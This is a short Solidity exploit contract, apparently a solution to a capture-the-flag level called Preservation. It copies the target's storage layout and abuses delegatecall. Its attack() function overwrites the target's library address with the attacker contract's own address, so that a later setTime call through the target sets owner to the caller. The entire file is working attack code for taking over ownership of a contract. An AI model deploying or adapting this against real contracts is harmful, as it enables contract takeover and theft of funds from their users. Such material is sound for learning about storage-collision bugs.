// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IContract {
    function setFirstTime(uint) external;
}

contract PreservationAttack {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint) public {
        owner = msg.sender;
    }

    function attack(address _to) external {
        IContract(_to).setFirstTime(uint256(uint160(address(this))));
    }
}
